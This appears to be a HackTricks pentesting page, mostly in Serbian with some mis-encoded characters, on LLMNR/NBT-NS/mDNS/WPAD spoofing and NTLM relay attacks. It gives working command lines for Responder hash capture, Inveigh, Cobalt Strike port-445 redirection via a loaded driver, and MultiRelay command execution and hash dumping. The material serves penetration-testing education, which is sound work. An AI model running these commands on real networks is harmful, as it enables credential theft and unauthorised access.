# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Network Protocols

### Local Host Resolution Protocols
- **LLMNR, NBT-NS, and mDNS**:
- Microsoft i drugi operativni sistemi koriste LLMNR i NBT-NS za lokalno re코avanje imena kada DNS zaka쬰. Sli캜no, Apple i Linux sistemi koriste mDNS.
- Ovi protokoli su podlo쬹i presretanju i spoofingu zbog svoje neautentifikovane, broadcast prirode preko UDP-a.
- [Responder](https://github.com/lgandx/Responder) se mo쬰 koristiti za impersonaciju usluga slanjem la쬹ih odgovora hostovima koji postavljaju upite ovim protokolima.
- Dodatne informacije o impersonaciji usluga koriste캖i Responder mogu se na캖i [ovde](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)
- WPAD omogu캖ava pretra쬴va캜ima da automatski otkriju postavke proxy-a.
- Otkri캖e se olak코ava putem DHCP-a, DNS-a, ili povratka na LLMNR i NBT-NS ako DNS zaka쬰.
- Responder mo쬰 automatizovati WPAD napade, usmeravaju캖i klijente ka zlonamernim WPAD serverima.

### Responder for Protocol Poisoning
- **Responder** je alat koji se koristi za trovanje LLMNR, NBT-NS i mDNS upita, selektivno odgovaraju캖i na osnovu tipova upita, prvenstveno cilja SMB usluge.
- Dolazi unapred instaliran u Kali Linux-u, konfigurisanje se vr코i na `/etc/responder/Responder.conf`.
- Responder prikazuje uhva캖ene he코ove na ekranu i 캜uva ih u direktorijumu `/usr/share/responder/logs`.
- Podr쬬va i IPv4 i IPv6.
- Windows verzija Responder-a je dostupna [ovde](https://github.com/lgandx/Responder-Windows).

#### Running Responder
- Da biste pokrenuli Responder sa podrazumevanim postavkama: `responder -I <Interface>`
- Za agresivnije ispitivanje (sa potencijalnim nuspojavama): `responder -I <Interface> -P -r -v`
- Tehnike za hvatanje NTLMv1 izazova/odgovora radi lak코eg razbijanja: `responder -I <Interface> --lm --disable-ess`
- WPAD impersonacija mo쬰 se aktivirati sa: `responder -I <Interface> --wpad`
- NetBIOS zahtevi mogu se re코iti na IP napada캜a, a mo쬰 se postaviti i proxy za autentifikaciju: `responder.py -I <interface> -Pv`

### DHCP Poisoning with Responder
- Spoofing DHCP odgovora mo쬰 trajno otrovati rutiranje informacija rtve, nude캖i diskretniju alternativu ARP trovanju.
- Zahteva precizno poznavanje konfiguracije ciljne mre쬰.
- Pokretanje napada: `./Responder.py -I eth0 -Pdv`
- Ova metoda mo쬰 efikasno uhvatiti NTLMv1/2 he코ove, ali zahteva pa쬷jivo rukovanje kako bi se izbeglo ometanje mre쬰.

### Capturing Credentials with Responder
- Responder 캖e impersonirati usluge koriste캖i gore pomenute protokole, hvataju캖i akreditive (obi캜no NTLMv2 izazov/odgovor) kada korisnik poku코a da se autentifikuje protiv spoofovanih usluga.
- Mogu se poku코ati da se pre캠e na NetNTLMv1 ili onemogu캖i ESS radi lak코eg razbijanja akreditiva.

Va쬹o je napomenuti da se kori코캖enje ovih tehnika mora vr코iti legalno i eti캜ki, osiguravaju캖i odgovaraju캖u autorizaciju i izbegavaju캖i ometanje ili neovla코캖en pristup.

## Inveigh

Inveigh je alat za penetracione testere i red timere, dizajniran za Windows sisteme. Nudi funkcionalnosti sli캜ne Responder-u, obavljaju캖i spoofing i man-in-the-middle napade. Alat se razvio iz PowerShell skripte u C# binarni, sa [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) i [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) kao glavnim verzijama. Detaljni parametri i uputstva mogu se na캖i u [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh se mo쬰 koristiti kroz PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ili izvr코eno kao C# binarni fajl:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Ovaj napad koristi SMB autentifikacione sesije za pristup ciljnim ma코inama, omogu캖avaju캖i sistemsku ljusku ako je uspe코an. Klju캜ni preduslovi uklju캜uju:
- Autentifikovani korisnik mora imati lokalni administratorski pristup na preusmerenoj host ma코ini.
- SMB potpisivanje treba biti onemogu캖eno.

#### 445 Port Forwarding and Tunneling

U scenarijima gde direktno umre쬬vanje nije izvodljivo, saobra캖aj na portu 445 treba preusmeriti i tunelovati. Alati poput [**PortBender**](https://github.com/praetorian-inc/PortBender) poma쬿 u preusmeravanju saobra캖aja sa porta 445 na drugi port, 코to je od su코tinskog zna캜aja kada je dostupan lokalni administratorski pristup za u캜itavanje drajvera.

PortBender pode코avanje i rad u Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Other Tools for NTLM Relay Attack

- **Metasploit**: Podesite sa proxy-ima, lokalnim i udaljenim detaljima hosta.
- **smbrelayx**: Python skripta za preusmeravanje SMB sesija i izvr코avanje komandi ili postavljanje backdoor-a.
- **MultiRelay**: Alat iz Responder paketa za preusmeravanje specifi캜nih korisnika ili svih korisnika, izvr코avanje komandi ili dumpovanje hash-eva.

Each tool can be configured to operate through a SOCKS proxy if necessary, enabling attacks even with indirect network access.

### MultiRelay Operation

MultiRelay se izvr코ava iz _**/usr/share/responder/tools**_ direktorijuma, ciljaju캖i specifi캜ne IP adrese ili korisnike.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Ovi alati i tehnike 캜ine sveobuhvatan skup za sprovo캠enje NTLM Relay napada u raznim mre쬹im okru쬰njima.

### Prisiljavanje NTLM prijava

Na Windows-u **mo쬯a 캖ete mo캖i da prisilite neke privilegovane naloge da se autentifikuju na proizvoljnim ma코inama**. Pro캜itajte slede캖u stranicu da biste saznali kako:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Reference
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr코ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
